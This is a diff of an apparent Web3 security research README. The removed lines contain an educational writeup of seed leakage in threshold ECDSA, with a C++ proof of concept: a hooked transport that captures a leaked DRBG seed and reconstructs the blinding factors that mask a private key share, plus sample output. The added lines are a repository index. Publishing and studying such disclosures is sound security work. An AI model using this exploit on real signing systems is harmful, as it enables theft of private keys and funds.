@@ -1,73 +1,57 @@
-Disclosure: Educational abstraction of a real-world zero-day. Vendor specifics and core namespaces are simulated. The math and architectural flaw remain 1:1 with the original exploit.
-[CRITICAL] DRBG State Leakage in Threshold ECDSA (Full Key Compromise)
-Author: Ayoub Aragui (aragui99)
-Category: Cryptographic Invariant Breach
-Language: C/C++
-Context & Invariant
-In t-of-n ECDSA setups, Oblivious Transfer (OT) phases require ephemeral entropy seeds to instantiate a local DRBG. This DRBG generates the blinding factors (v_{l,t}) that mask the user's secret key share (x_i).
-Invariant: The DRBG root seed is strictly ephemeral. It must never leave the node's isolated memory or cross the network transport layer.
-The Flaw
+# Web3 Security Research
 
-MaskedShare \equiv (x_i + v_i) \pmod q
+Educational security research by **Ayoub Aragui (aragui99)**.
 
+Each writeup is an abstracted, vendor-genericized reproduction of a real-world
+vulnerability. The math and architectural flaws remain 1:1 with the originals.
 
-Since the attacker has the victim's leaked seed, they can spin up an identical local DRBG. v_i is no longer random; it's a known constant. The attacker simply reverses the mask
+## Writeups
 
+| Severity | Title | Category | Language |
+|----------|-------|----------|----------|
+| CRITICAL | [DRBG State Leakage in Threshold ECDSA](Cryptographic-Flaws/DRBG_State_Leakage.md) | Cryptographic Invariant Breach | C/C++ |
+| CRITICAL | [Asymmetric Signature Validation (Infinite Reserve Minting)](Core-Infrastructure/Asymmetric_State_Minting.md) | State Deviation | C/C++ |
+| CRITICAL | [Isolated Collateral Exhaustion (Global Debt Erasure)](DeFi-Logic-Flaws/Triple_Asset_Debt_Wipeout.md) | Economic Invariant Breach | Rust (Soroban) |
 
-x_i \equiv (MaskedShare - v_{reconstructed}) \pmod q
+## Repository Structure
 
+```
+.
+├── Cryptographic-Flaws/     # Cryptographic invariant breaches
+├── Core-Infrastructure/     # DLT / state-machine level flaws
+├── DeFi-Logic-Flaws/        # DeFi economic & logic exploits
+├── shared/
+│   ├── cpp/
+│   │   ├── audit_log.h      # Logging & assertion macros (C/C++)
+│   │   └── test_harness.h   # Base PoC test class (C/C++)
+│   └── rust/
+│       └── src/
+│           ├── lib.rs
+│           └── audit_log.rs  # Logging & assertion macros (Rust)
+└── templates/
+    └── WRITEUP_TEMPLATE.md   # Template for new writeups
+```
 
-Impact: Complete 1-of-n compromise. The threshold is bypassed, the full private key is reconstructed, and the attacker dictates all signatures.
-PoC (Passive Transport Hook)
+## Shared Utilities
 
+All PoC code uses shared logging and assertion helpers so that output is
+consistent across writeups and languages.
 
-#include <iostream>
-#include <vector>
-#include <cstring>
-#include <mpc_core/api/tss_ecdsa.h>
-#include <mpc_core/internal/crypto/rng.h>
+### C/C++
 
-using namespace mpc_lib;
+```cpp
+#include "shared/cpp/audit_log.h"    // AUDIT_INFO, AUDIT_CRITICAL, AUDIT_ASSERT, AUDIT_ASSERT_EQ
+#include "shared/cpp/test_harness.h" // audit::test_harness base class
+```
 
-class mal_transport final : public data_transport_i {
-public:
-    explicit mal_transport(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {}
-    
-    error_t receive_all(const std::vector<party_idx_t>& senders, std::vector<buf_t>& msgs) override {
-        error_t rv = ctx_->receive_all(senders, msgs);
-        if (rv != SUCCESS) return rv;
+### Rust
 
-        for (size_t i = 0; i < msgs.size(); i++) {
-            if (msgs[i].size() >= 32) {
-                buf256_t seed;
-                std::memcpy(&seed, msgs[i].data(), 32); // grab the leaked seed
-                
-                // init malicious drbg
-                crypto::deterministic_rng_t atk_drbg(seed);
-                bn_t q = bn_t::from_hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
-                
-                // boom. generate the exact blinding factors
-                for(int t = 0; t < 2; t++) {
-                    std::cout << "[*] aragui99 Audit - Expected: " << atk_drbg.gen_bn(q).to_hex() << "\n";
-                }
-            }
-        }
-        return rv;
-    }
-private:
-    std::shared_ptr<net_context_t> ctx_;
-};
+```rust
+#[macro_use] extern crate shared;    // audit_info!, audit_critical!, audit_assert!, audit_assert_eq!
+```
 
+## Adding a New Writeup
 
-Output Logs
-Running the hook passively dumps the masking variables natively:
-
-
-[*] Initializing 2 Independent Parties (Public API Entry Point)...
-
-[aragui99-Network-Hook] INTERCEPTED BROADCAST FROM PARTY 0!
-[aragui99-Network-Hook] Extracting 32-byte deterministic seed from payload...
-[aragui99-Exploit] DRBG Reconstructed. Victim's Blinding Factors (v_1):
-  -> 4FBDF43C89AFFB6A28ADDF51E77C64F28C3502BBF0E1B284CCAB5707D4D8BC10
-  -> 958FC4BEBF819D5CC0FD7018ACB9C0F8A6DE5C0F8B95B0C3B5CA719E7B116AF
-[aragui99-Exploit] CRITICAL: Private Key Share x_i is now mathematically exposed.
+1. Copy `templates/WRITEUP_TEMPLATE.md` into the appropriate category directory.
+2. Use the shared logging macros in your PoC code.
+3. Add a row to the table above.
